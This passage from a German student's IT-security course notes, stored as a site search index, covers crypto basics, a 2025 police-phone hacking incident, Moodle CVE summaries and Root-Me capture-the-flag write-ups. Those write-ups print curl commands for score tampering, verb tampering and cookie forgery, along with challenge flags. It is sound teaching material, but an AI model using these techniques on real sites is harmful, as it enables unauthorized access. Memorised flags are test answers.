Algorithmen"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#nachteile","title":"\u274c Nachteile:","text":"Problem Warum es unpraktisch ist Schl\u00fcsselverteilung Schl\u00fcssel muss geheim und sicher \u00fcbermittelt werden - genauso lang wie die Nachricht Kein Wiederverwenden erlaubt Sonst angreifbar (bekannt als \u201eTwo-Time Pad\u201c-Angriff) Kein Key Management m\u00f6glich Z.\u202fB. f\u00fcr Millionen Nutzer nicht praktikabel <p>\u27a1\ufe0f Wird nur in der Spionage oder bei diplomatischen Missionen verwendet - mit physisch \u00fcbergebenen Schl\u00fcsselb\u00fcchern</p>"},{"location":"studium/IT-Security/IT-Security%20Zusammenfassung/#beispiel-nonce","title":"\ud83d\udd10 Beispiel: Nonce","text":"<p>\u201eNumber used once\u201c - eine einmalig verwendete Zufallszahl in einem Protokoll</p> <p>\u27a1\ufe0f Wird z.\u202fB. beim Login oder in Netzwerkprotokollen genutzt, um sicherzustellen: - Anfragen sind frisch - Es wird nichts wiederholt oder aufgezeichnet</p> <p>Beispiel: - Server schickt Nonce: <code>723984</code> - Client antwortet mit: <code>Signatur(Nutzername + Passwort + Nonce)</code></p> <p>\u2192 Wenn ein Angreifer das mitschneidet, n\u00fctzt es ihm nichts beim n\u00e4chsten Versuch</p>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/","title":"IT Security Aktuelles(2025)","text":"<p>Current Attacks Find a report - that is not older than three months - about a malware attack on a company or public institution in Germany. Describe the attack and how malware was used to overcome security mechanisms and achieve the attacker\u2019s goals. Could the attack or its effects have been prevented? How?</p> <p>Die Landespolizei Mecklenburg\u2011Vorpommern ist laut Innenministerium Opfer eines Hackerangriffs geworden. Betroffen sind Diensthandys \u2026 \u00fcber den Server, der diese Smartphones vernetzt Ein Hacker-Angriff zielte auf den zentralen Server, der dienstliche Smartphones verwaltet und sch\u00fctzt. Die Angreifer versuchten, Zugriff auf dieses System zu erhalten. Anfang Juni 2025 (um den 2.-4.\u202fJuni wurden die Vorf\u00e4lle \u00f6ffentlich)</p> <p>In der Folge waren viele Diensthandys nicht mehr einsatzbereit. Die Beamt:innen mussten wieder auf analoge Funkger\u00e4te zur\u00fcckgreifen - teilweise sogar einfache Kulis, um Kennzeichen zu notieren, nachdem digitale Apps ausgefallen waren.</p> <p>Die Gewerkschaft der Polizei MV sprach schnell eine Warnung aus und forderte von der Landesregierung verst\u00e4rkte Ma\u00dfnahmen zur IT-Sicherheit: Modernisierung der Infrastruktur, mehr Schutz f\u00fcr mobile Ger\u00e4te und zeitnahe Reaktionspl\u00e4ne.</p> <ul> <li>\u00d6ffentlich ist lediglich von einem Hacker-Angriff oder Manipulationsversuch die Rede - keine Hinweise auf Ransomware oder klassisches Malware\u2011Payload</li> <li>Es scheint eher eine Attacke auf die zentrale Serverinfrastruktur gewesen zu sein, m\u00f6glicherweise kombiniert mit Zugriff auf Anmeldedaten oder Schwachstellen.</li> </ul> <p>Welche Mechnismen w\u00fcrden ein solches Risiko minimieren? - Endpoint-Schutz kritischer mobiler Ger\u00e4te ist essenziell - gerade bei Polizei-Diensthandys m\u00fcssen Schutzmechanismen wie MDM (Mobile Device Management)(Black Berry UEM), Zwei-Faktor-Authentifizierung und regelm\u00e4\u00dfige Sicherheitsupdates vorhanden sein. - Redundante Kommunikationssysteme (z.\u202fB. analoge Funkger\u00e4te) sind unerl\u00e4sslich - digitale L\u00f6sungen allein reichen oft noch nicht aus. - Fr\u00fchwarnsysteme und Incident-Response-Pl\u00e4ne m\u00fcssen vorhanden sein, damit im Notfall eine schnelle Reaktion m\u00f6glich ist. - Netzwerksegmentierung &amp; Zero\u2011Trust\u2011Prinzip- Trenne MDM-Server/Verwaltungsnetz (VLAN A) strikt vom Mitarbeiternetz (VLAN B). - Monitoring &amp; Intrusion Detection - Definiere Regeln, z.\u202fB. f\u00fcr ungew\u00f6hnlich viele Login-Versuche, Remote-Wipe-Befehle oder neue Ger\u00e4teinstallationen. Generiere einen Test-Angriff (Brute\u2011Force\u2011Versuch) - und beobachte einen ausgel\u00f6sten Alarm.</p> <p>https://konbriefing.com/de-topics/hackerangriff-deutschland.html https://www.ostsee-zeitung.de/mecklenburg-vorpommern/mecklenburg-vorpommern-hackerangriff-legt-polizeihandys-lahm-2FEWD6V2DVH5XAK4XGKMLYWTPU.html https://security-network.com/angriffsversuch-auf-dienstliche-smartphones/ https://www.gdp.de/mv/de/stories/2025/06/04062025-versuchter-cyberangriff https://www.golem.de/news/mecklenburg-vorpommern-hackerangriff-trifft-diensthandys-der-polizei-2506-196815.html</p>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#21-wie-viele-neue-malwarevarianten-werden-taglich-gemeldet","title":"2.1 Wie viele neue Malware\u2011Varianten werden t\u00e4glich gemeldet?","text":"<p>Im BSI\u2011Lagebericht 2024 hei\u00dft es:</p> <p>Im Berichtszeitraum wurden t\u00e4glich durchschnittlich\u202f300\u202f000 neue Schadprogramm\u2011Varianten bekannt\u201c (S.\u202f16)(2024)(Die Lage der IT\u2011Sicherheit in Deutschland 2024). https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Lageberichte/Lagebericht2024.pdf</p>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#22-was-ist-ein-botnet-und-welches-betriebssystem-wird-am-haufigsten-angegriffen","title":"2.2 Was ist ein Botnet, und welches Betriebssystem wird am h\u00e4ufigsten angegriffen?","text":"<ul> <li>Botnet: Ein Netzwerk aus kompromittierten Ger\u00e4ten, welche Fernsteuerung erm\u00f6glichen und Angriffszwecken (z.\u202fB. Spam, DDoS) dienen.(S.15)</li> <li>H\u00e4ufigstes Zielsystem: Laut BSI\u2011Lagebericht 2024 wurde insbesondere Windows (64\u2011Bit) am st\u00e4rksten angegriffen - hier gab es einen Anstieg von 256\u202f%. https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Publikationen/Lageberichte/Lagebericht2024.pdf</li> </ul>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#23-welche-typischen-aktionen-fuhren-angreifer-vor-der-ausfuhrung-einer-ransomware-attacke-durch","title":"2.3 Welche typischen Aktionen f\u00fchren Angreifer vor der Ausf\u00fchrung einer Ransomware-Attacke durch?","text":"<p>Im BSI\u2011Magazin 2022/02 (\u201eSecurity in Focus\u201c) wird der Ablauf wie folgt beschrieben:</p> <ol> <li>Erste Infektion meist \u00fcber pr\u00e4parierte E\u2011Mail Anh\u00e4nge (Phishing).</li> <li>Anschlie\u00dfende Erkundung des Netzwerks - Suche nach offenen oder ungepatchten Servern.</li> <li>Aufbau persistenter Zug\u00e4nge, um Ransomware zielgerichtet auszurollen. (S20-21)(Kapitel \"Digital Exortion With Ransomware\")  https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Publications/Magazin/BSI-Magazin_2022-02.pdf</li> </ol>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#24-welche-schutzmechanismen-empfiehlt-der-itgrundschutz-gegen-malware","title":"2.4 Welche Schutzmechanismen empfiehlt der IT\u2011Grundschutz gegen Malware?","text":"<p>Aus dem IT\u2011Grundschutz\u2011Kompendium (BSI):</p> Ma\u00dfnahme ID(s) Ebene Anti-Malware OPS.1.1.4 Basis Patch-Management OPS.1.1.3 Basis System Hardening &amp; Tests OPS.1.1.6 / OPS.1.1.7 Basis-Standard Logging &amp; Erkennung OPS.1.1.5 / DER.1 Basis-Standard/Hoch MDM f\u00fcr mobile Endger\u00e4te SYS.3.2.2 Basis-Standard/Hoch - Diese Anforderungen decken sowohl technische (Antivirus, Updates, Hardening) als auch organisatorische Ma\u00dfnahmen (Logging, Zugangskontrolle) ab und sind essentiell f\u00fcr umfassende Malware\u2011Abwehr. https://www.bsi.bund.de/SharedDocs/Downloads/DE/BSI/Grundschutz/IT-GS-Kompendium/IT_Grundschutz_Kompendium_Edition2023.html"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#1-cve202323923-cvss-31-82-high","title":"1. CVE\u20112023\u201123923 (CVSS\u202f3.1\u202f=\u202f8.2\u202fHigh)","text":"<ul> <li> <p>Beschreibung: Eine Remote-Attacke auf die \u201eStart Page\u201c-Einstellung erm\u00f6glichte es Angreifern, die Startseite anderer Nutzer unbefugt festzulegen - potenziell als Sprungbrett f\u00fcr Privilegienausweitung oder Session-Manipulation</p> </li> <li> <p>Betroffene Assets &amp; Schutzziele:</p> <ul> <li>Assets: User-Profile/Dashboard-Details; Session-Verwaltung.</li> <li>Schutzziele: Confidentiality/Integrit\u00e4t von Benutzereinstellungen bzw. Sitzungsinformationen.</li> </ul> </li> <li>Workaround (ohne Patch): Deaktiviere oder beschr\u00e4nke die \u201eStart Page\u201c-Option via Admin-Plugin oder konfiguriere Rollen so, dass nur vertrauensw\u00fcrdige Nutzer diese Einstellung \u00e4ndern k\u00f6nnen.</li> </ul>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#2-cve20235540-cvss-31-88-high","title":"2. CVE\u20112023\u20115540 (CVSS\u202f3.1\u202f=\u202f8.8\u202fHigh)","text":"<ul> <li> <p>Beschreibung: In Moodle\u2019s IMSCP-Modul (zur Integration von IMS Content Packages) konnten authentifizierte Lehrer oder Manager beliebigen Code auf dem Server ausf\u00fchren </p> </li> <li> <p>Betroffene Assets &amp; Schutzziele:</p> <ul> <li>Assets: Webanwendung, Serversystem, installierte Pakete.</li> <li>Schutzziele: Confidentiality, Integrity, Availability - vollst\u00e4ndige Kompromittierung m\u00f6glich.</li> </ul> </li> <li>Workaround: Deaktiviere das IMSCP-Modul tempor\u00e4r \u00fcber die Moodle-Administration oder beschr\u00e4nke den Zugriff auf vertrauensw\u00fcrdige Rollen, bis das Update eingespielt werden kann.</li> </ul>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#3-cve202335133-cvss-31-75-high","title":"3. CVE\u20112023\u201135133 (CVSS\u202f3.1\u202f=\u202f7.5\u202fHigh)","text":"<ul> <li> <p>Beschreibung: Eine fehlerhafte Pr\u00fcfung auf <code>0.0.0.0</code> in cURL f\u00fchrte zu einem SSRF-Risiko (Server-Side Request Forgery), bei dem interne Systeme von au\u00dfen angesteuert werden konnten</p> </li> <li> <p>Betroffene Assets &amp; Schutzziele:</p> <ul> <li>Assets: Innerhalb des Moodle\u2011Servers befindliche Mikroservices, interne Netzwerke.</li> <li>Schutzziele: Confidentiality - Abfluss sensibler Informationen ins Internet war m\u00f6glich.</li> </ul> </li> <li>Workaround: Setze Firewall-Regeln, die ausgehende Anfragen vom Moodle-Server zu <code>0.0.0.0</code> oder internen IPs blockieren. Alternativ erschwere den SSRF-Exploit durch Proxy-Konfiguration.</li> </ul>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#4-cve202328329-cvss-31-88-high","title":"4. CVE\u20112023\u201128329 (CVSS\u202f3.1\u202f=\u202f8.8\u202fHigh)","text":"<ul> <li> <p>Beschreibung: Unsichere Profile-Feldeinstellungen f\u00fchrten zu einer SQL-Injection, ausnutzbar durch Lehrer oder Manager via speziell pr\u00e4parierten Bedingungen</p> </li> <li> <p>Betroffene Assets &amp; Schutzziele:</p> <ul> <li>Assets: Datenbanken, Nutzerprofile.</li> <li>Schutzziele: Confidentiality, Integrity - Datenmanipulation oder -diebstahl m\u00f6glich.</li> </ul> </li> <li>Workaround: Schr\u00e4nke das \u00c4ndern bestimmter Profilfelder ein oder deaktivere die entsprechenden Funktionen bis zum Update.</li> </ul>"},{"location":"studium/IT-Security/IT-Security-Aktuelles%282025%29/#5-cve202328335-cvss-31-88-high","title":"5. CVE\u20112023\u201128335 (CVSS\u202f3.1\u202f=\u202f8.8\u202fHigh)","text":"<ul> <li> <p>Beschreibung: Ein CSRF-Schwachpunkt in der Funktion zum Zur\u00fccksetzen von Datenbank-Aktivit\u00e4tsvorlagen erm\u00f6glichte es Angreifern, diesen Vorgang \u00fcber manipulierte Links auszul\u00f6sen </p> </li> <li> <p>Betroffene Assets &amp; Schutzziele:</p> <ul> <li>Assets: Templates und Konfigurationsdaten.</li> <li>Schutzziele: Integrity, Availability - unerw\u00fcnschte \u00c4nderungen oder Datenverlust m\u00f6glich.</li> </ul> </li> <li>Workaround: Nur vertrauensw\u00fcrdigen Nutzern das Recht zum Zur\u00fccksetzen erlauben, oder den Admin-Link vorerst deaktiviert lassen.</li> </ul>"},{"location":"studium/IT-Security/IT-Security-HTTP/","title":"Root-Me HTTP Dokumentation","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#root-me-http-dokumentation","title":"Root-Me HTTP Dokumentation","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#challenge-ziel-http-post","title":"\ud83e\udde9 Challenge-Ziel (HTTP-Post)","text":"<p>Ziel: Das Ziel dieser Challenge besteht darin, die serverseitige Verarbeitung von HTTP-POST-Anfragen zu manipulieren, um einen Highscore von 999999 oder h\u00f6her zu erreichen. Die bereitgestellte HTML-Seite enth\u00e4lt ein Formular, das beim Absenden einen zuf\u00e4lligen Score generiert. Unser Ziel ist es, diesen Mechanismus zu umgehen und einen gew\u00fcnschten Score direkt an den Server zu senden.</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#analyse-der-webseite","title":"\ud83e\udde0 Analyse der Webseite","text":"<p>Beim Aufrufen der Challenge-Seite unter:\u200b</p> <p><code>http://challenge01.root-me.org/web-serveur/ch56/</code></p> <p>wird folgendes HTML-Formular angezeigt:\u200b</p> <pre><code>&lt;form action=\"\" method=\"post\" onsubmit=\"document.getElementsByName('score')[0].value = Math.floor(Math.random() * 1000001)\"&gt;\n    &lt;input type=\"hidden\" name=\"score\" value=\"-1\" /&gt;\n    &lt;input type=\"submit\" name=\"generate\" value=\"Give a try!\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Hierbei wird beim Absenden des Formulars mittels JavaScript ein zuf\u00e4lliger Wert zwischen 0 und 1.000.000 generiert und als Wert des versteckten Feldes <code>score</code> gesetzt. Da die Validierung clientseitig erfolgt, k\u00f6nnen wir dies umgehen, indem wir direkt eine HTTP-POST-Anfrage mit einem manipulierten Score senden.</p> <p>Wir schauen im Entwicklertool vom Browser wo sich die POST-Anfrage befindet und kopieren dern cURL befehl. Diesen ver\u00e4ndern wir bei <code>score=1000000</code> und senden diesen als cmd Befehl \u00fcber die konsole. Als Antwort erhalten wir in unserer Konsole die HTML-Seite mit dem richtigen Ergebnis und der L\u00f6sung.</p> <p>Kopierte Post anfrage als cURL </p><pre><code>curl ^\"http://challenge01.root-me.org/web-serveur/ch56/^\" ^\n  -H ^\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7^\" ^\n  -H ^\"Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7^\" ^\n  -H ^\"Cache-Control: max-age=0^\" ^\n  -H ^\"Connection: keep-alive^\" ^\n  -H ^\"Content-Type: application/x-www-form-urlencoded^\" ^\n  -b ^\"_ga=GA1.1.1454924502.1745766922; _ga_SRYSKX09J7=GS1.1.1745781207.3.1.1745781207.0.0.0^\" ^\n  -H ^\"Origin: http://challenge01.root-me.org^\" ^\n  -H ^\"Referer: http://challenge01.root-me.org/web-serveur/ch56/^\" ^\n  -H ^\"Upgrade-Insecure-Requests: 1^\" ^\n  -H ^\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36^\" ^\n  --data-raw ^\"score=703828^&amp;generate=Give+a+try^%^21^\" ^\n  --insecure\n</code></pre><p></p> <p>Angepasste Anfrage f\u00fcr Konsole <code>curl -X POST -d \"score=1000000&amp;generate=Give+a+try%21\" http://challenge01.root-me.org/web-serveur/ch56/</code></p> <pre><code>C:\\Users\\nico-&gt;curl -X POST -d \"score=1000000&amp;generate=Give+a+try%21\" http://challenge01.root-me.org/web-serveur/ch56/\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;HTTP Basics&lt;/title&gt;\n    &lt;/head&gt;\n\n   &lt;body&gt;&lt;link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /&gt;&lt;iframe id='iframe' src='https://www.root-me.org/?page=externe_header'&gt;&lt;/iframe&gt;\n        &lt;h1&gt;RandGame&lt;/h1&gt;\n        &lt;h2&gt;Human vs. Machine&lt;/h2&gt;\n        &lt;hr&gt;\n        &lt;p&gt;Here is my new game. It's not totally finished but I'm sure nobody can beat me! ;)&lt;/p&gt;\n        &lt;ul&gt;\n            &lt;li&gt;Rules: click on the button to hope to generate a great score&lt;/li&gt;\n            &lt;li&gt;Score to beat: &lt;strong&gt;999999&lt;/strong&gt;&lt;/li&gt;\n        &lt;/ul&gt;\n\n        &lt;p&gt;Wow, 1000000! How did you do that? :o&lt;/p&gt;&lt;p&gt;Flag to validate the challenge: &lt;strong&gt;H7tp_h4s_N0_s3Cr37S_F0r_y0U\n&lt;/strong&gt;&lt;/p&gt;\n        &lt;form action=\"\" method=\"post\" onsubmit=\"document.getElementsByName('score')[0].value = Math.floor(Math.random() * 1000001)\"&gt;\n            &lt;input type=\"hidden\" name=\"score\" value=\"-1\" /&gt;\n            &lt;input type=\"submit\" name=\"generate\" value=\"Give a try!\"&gt;\n        &lt;/form&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p></p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#challenge-ziel-http-improper-redirect","title":"\ud83e\udde9 Challenge-Ziel (HTTP - Improper Redirect)","text":"<p>Ziel: Diese Challenge demonstriert eine h\u00e4ufige Schwachstelle in PHP-Anwendungen, bei der nach einer Weiterleitung mittels <code>header('Location: ...')</code> kein <code>exit();</code> oder <code>die();</code> aufgerufen wird. Dadurch wird der nachfolgende Code weiterhin ausgef\u00fchrt und an den Client gesendet, obwohl eine Weiterleitung stattgefunden hat.\u200b</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#analyse-der-webseite_1","title":"\ud83e\udde0 Analyse der Webseite","text":"<p>Beim Aufrufen der Challenge-Seite unter:\u200b</p> <p><code>http://challenge01.root-me.org/web-serveur/ch32/</code></p> <p>wird ein Login-Formular angezeigt. Nach dem Absenden des Formulars mit beliebigen Zugangsdaten erfolgt eine Weiterleitung.\u200b</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#losungsschritte","title":"\ud83d\udee0\ufe0f L\u00f6sungsschritte","text":"<ol> <li> <p>HTTP-Antwort analysieren: Um die vollst\u00e4ndige HTTP-Antwort einschlie\u00dflich der Header und des Body zu sehen, verwenden wir den folgenden Befehl:</p> <p><code>curl -i http://challenge01.root-me.org/web-serveur/ch32/</code></p> </li> </ol> <p>Erkl\u00e4rung:</p> <ul> <li><code>-i</code>: Zeigt die HTTP-Header der Antwort an.</li> <li> <p>Die URL ist die Adresse der Challenge.\u200b</p> </li> <li> <p>Analyse der Antwort: Die Antwort enth\u00e4lt eine <code>302 Found</code>-Weiterleitung, gefolgt vom HTML-Inhalt der urspr\u00fcnglichen Seite. In diesem HTML-Inhalt finden wir den Flag.</p> </li> </ul> <pre><code>C:\\Users\\nico-&gt;curl -i http://challenge01.root-me.org/web-serveur/ch32/\n\nHTTP/1.1 302 Found\nServer: nginx\nDate: Mon, 28 Apr 2025 16:04:28 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nLocation: ./login.php?redirect\n\n&lt;html&gt;\n&lt;body&gt;&lt;link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /&gt;&lt;iframe id='iframe' src='https://www.root-me.org/?page=externe_header'&gt;&lt;/iframe&gt;\n&lt;h1&gt;Welcome !&lt;/h1&gt;\n\n&lt;p&gt;Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...&lt;/p&gt;\n&lt;p&gt;&lt;a href=\"http://cwe.mitre.org/data/definitions/698.html\"&gt;CWE-698: Execution After Redirect (EAR)&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;The flag is : ExecutionAfterRedirectIsBad\n&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#hintergrundinformation","title":"\ud83d\udcdd Hintergrundinformation","text":"<p>In PHP sollte nach einer Weiterleitung mittels <code>header(\"Location: ...\")</code> immer ein <code>exit();</code> oder <code>die();</code> folgen, um sicherzustellen, dass kein weiterer Code ausgef\u00fchrt wird. In dieser Challenge wurde dies absichtlich weggelassen, wodurch der nachfolgende HTML-Inhalt (inklusive des Flags) weiterhin an den Client gesendet wird, obwohl eine Weiterleitung stattgefunden hat.</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#challenge-ziel-http-verb-tampering","title":"\ud83e\udde9 Challenge-Ziel (HTTP - Verb Tampering)","text":"<p>Ziel: Diese Challenge demonstriert eine Schwachstelle, bei der durch die Manipulation des HTTP-Verbs (auch bekannt als HTTP-Methode) Zugriff auf Ressourcen erlangt werden kann, die normalerweise durch Zugriffskontrollen gesch\u00fctzt sind.\u200b</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#analyse-der-webseite_2","title":"\ud83e\udde0 Analyse der Webseite","text":"<p>Beim Aufrufen der Challenge-Seite unter:\u200b</p> <p><code>http://challenge01.root-me.org/web-serveur/ch8/</code></p> <p>wird der Zugriff verweigert. Dies deutet darauf hin, dass bestimmte HTTP-Methoden (wie GET oder POST) durch Zugriffskontrollen eingeschr\u00e4nkt sind.\u200b</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#losungsschritte_1","title":"\ud83d\udee0\ufe0f L\u00f6sungsschritte","text":"<ol> <li> <p>Senden einer Anfrage mit einer alternativen HTTP-Methode: Um die Zugriffskontrolle zu umgehen, senden wir eine Anfrage mit einer anderen HTTP-Methode, beispielsweise <code>OPTIONS</code>.</p> <p>Verwenden von <code>curl</code>: </p><pre><code>curl -X OPTIONS \"http://challenge01.root-me.org/web-serveur/ch8/\" ^\n  -H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\" ^\n  -H \"Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\" ^\n  -H \"Cache-Control: max-age=0\" ^\n  -H \"Connection: keep-alive\" ^\n  -b \"_ga=GA1.1.1454924502.1745766922; _ga_SRYSKX09J7=GS1.1.1745781207.3.1.1745781207.0.0.0\" ^\n  -H \"Upgrade-Insecure-Requests: 1\" ^\n  -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\" ^\n  --insecure\n</code></pre> Erkl\u00e4rung: - <code>-X OPTIONS</code>: Gibt an, dass die HTTP-Methode <code>OPTIONS</code> verwendet wird.<p></p> </li> <li> <p>Die URL ist die Adresse der Challenge.\u200b</p> </li> <li> <p>Analysieren der Serverantwort: Die Serverantwort sollte Informationen \u00fcber die unterst\u00fctzten HTTP-Methoden enthalten. Wenn die Zugriffskontrolle nur f\u00fcr bestimmte Methoden implementiert ist, k\u00f6nnte die Verwendung einer alternativen Methode wie <code>OPTIONS</code> den Zugriff erm\u00f6glichen.</p> </li> <li> <p>Extrahieren des Flags: Wenn die Anfrage erfolgreich ist, sollte die Serverantwort den Flag enthalten.</p> <p>Auszug der Ausgabe:</p> </li> </ol> <pre><code>&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;/head&gt;\n\n&lt;h1&gt;Mot de passe / password : a23e$dme96d3saez$$prap\n&lt;/h1&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>In diesem Beispiel lautet der Flag: <code>a23e$dme96d3saez$$prap</code></p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#hintergrundinformation_1","title":"\ud83d\udcdd Hintergrundinformation","text":"<p>HTTP Verb Tampering tritt auf, wenn ein Webserver oder eine Anwendung Zugriffskontrollen basierend auf HTTP-Methoden implementiert, jedoch nicht alle Methoden ordnungsgem\u00e4\u00df \u00fcberpr\u00fcft. Angreifer k\u00f6nnen alternative oder weniger h\u00e4ufig verwendete HTTP-Methoden verwenden, um Zugriff auf gesch\u00fctzte Ressourcen zu erhalten oder Sicherheitsmechanismen zu umgehen.</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#challenge-ziel-http-cookies","title":"\ud83e\udde9 Challenge-Ziel (HTTP - Cookies)","text":"<p>Ziel: Diese Challenge demonstriert eine Schwachstelle in der Cookie-Verwaltung, bei der durch Manipulation von Cookies Zugriff auf administrative Funktionen erlangt werden kann.\u200b</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#analyse-der-webseite_3","title":"\ud83e\udde0 Analyse der Webseite","text":"<p>Beim Aufrufen der Challenge-Seite unter:\u200b</p> <p><code>http://challenge01.root-me.org/web-serveur/ch7/</code></p> <p>wird ein Formular angezeigt, in dem eine E-Mail-Adresse eingegeben werden kann. Nach dem Absenden wird eine Best\u00e4tigung angezeigt, dass die E-Mail gespeichert wurde. Es gibt auch einen Link mit der Bezeichnung \"Saved email addresses\". Beim Klicken auf diesen Link erscheint die Meldung \"You need to be admin\".\u200b</p> <pre><code>&lt;br/&gt;\n&lt;br/&gt;\n&lt;fieldset&gt;\n\n&lt;form method=\"POST\" action=\"\" name=\"a\"&gt;\nEmail&lt;br/&gt;\n&lt;input type=\"text\" name=\"mail\" size=\"20\" class=\"post2\" value=\"\"&gt;&lt;br/&gt;&lt;br/&gt;\n&lt;input type=\"submit\" name=\"jsep4b\" size=\"20\" class=\"post2\" value=\"send\"&gt;&lt;br/&gt;&lt;br/&gt;\n&lt;/form&gt;&lt;!--SetCookie(\"ch7\",\"visiteur\");--&gt;&lt;a href=\"?c=visiteur\"&gt;Saved email adresses&lt;/a&gt;&lt;br/&gt;You need to be admin&lt;br/&gt;Email saved&lt;br/&gt;&lt;/fieldset&gt;\n</code></pre> <p>Im HTML-Quellcode ist folgender Kommentar zu finden:\u200b</p> <p><code>&lt;!--SetCookie(\"ch7\",\"visiteur\");--&gt;</code></p> <p>Dies deutet darauf hin, dass ein Cookie namens <code>ch7</code> mit dem Wert <code>visiteur</code> gesetzt wird.\u200b</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#losungsschritte_2","title":"\ud83d\udee0\ufe0f L\u00f6sungsschritte","text":"<ol> <li> <p>Senden einer POST-Anfrage: Zuerst senden wir eine POST-Anfrage, um den Cookie <code>ch7</code> zu erhalten.</p> <p>Verwenden von <code>curl</code>:</p> <p><code>curl -i -X POST -d \"mail=test@example.com&amp;jsep4b=send\" http://challenge01.root-me.org/web-serveur/ch7/</code></p> </li> </ol> <p>Erkl\u00e4rung:</p> <ul> <li><code>-i</code>: Zeigt die HTTP-Header der Antwort an.</li> <li><code>-X POST</code>: Verwendet die HTTP-Methode POST.</li> <li><code>-d</code>: Sendet die angegebenen Daten im Body der Anfrage.\u200b</li> </ul> <p>In der Antwort sollte ein <code>Set-Cookie</code>-Header vorhanden sein, der den Cookie <code>ch7=visiteur</code> setzt.</p> <ol> <li> <p>Manipulieren des Cookies: Nun \u00e4ndern wir den Wert des Cookies <code>ch7</code> von <code>visiteur</code> zu <code>admin</code> und senden eine GET-Anfrage, um die gespeicherten E-Mail-Adressen abzurufen.</p> <p>Verwenden von <code>curl</code>: <code>curl -i -b \"ch7=admin\" http://challenge01.root-me.org/web-serveur/ch7/?c=admin</code></p> </li> </ol> <p>Erkl\u00e4rung: - <code>-b \"ch7=admin\"</code>: Setzt den Cookie <code>ch7</code> auf den Wert <code>admin</code>.\u200b</p> <pre><code>C:\\Users\\nico-&gt;curl -i -b \"ch7=admin\" http://challenge01.root-me.org/web-serveur/ch7/?c=admin\n\n\nHTTP/1.1 200 OK\nServer: nginx\nDate: Mon, 28 Apr 2025 16:36:34 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nVary: Accept-Encoding\n\n&lt;div&gt;Validation password : ml-SYMPA\n&lt;/div&gt;&lt;/fieldset&gt;\nC:\\Users\\nico-&gt;\n</code></pre>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-HTTP/#hintergrundinformation_2","title":"\ud83d\udcdd Hintergrundinformation","text":"<p>Diese Challenge zeigt, wie wichtig eine sichere Verwaltung von Cookies ist. Wenn der Zugriff auf administrative Funktionen lediglich durch den Wert eines Cookies gesteuert wird, k\u00f6nnen Angreifer durch Manipulation dieses Cookies unbefugten Zugriff erlangen. Es ist daher entscheidend, dass Server die Authentizit\u00e4t und Integrit\u00e4t von Cookies \u00fcberpr\u00fcfen und nicht allein auf deren Vorhandensein oder Wert vertrauen.</p>","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/","title":"Root-Me XSS Dokumentation","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#root-me-xss-dokumentation","title":"Root-Me XSS Dokumentation","text":"","tags":["Course/"]},{"location":"studium/IT-Security/IT-Security-XSS/#challenge-ziel","title":"\ud83e\udde9 Challenge-Ziel","text":"<p>Ziel: Die Session-Cookies des Admin-Bots stehlen, indem eine AngularJS Template Injection ausgenutzt wird, um den 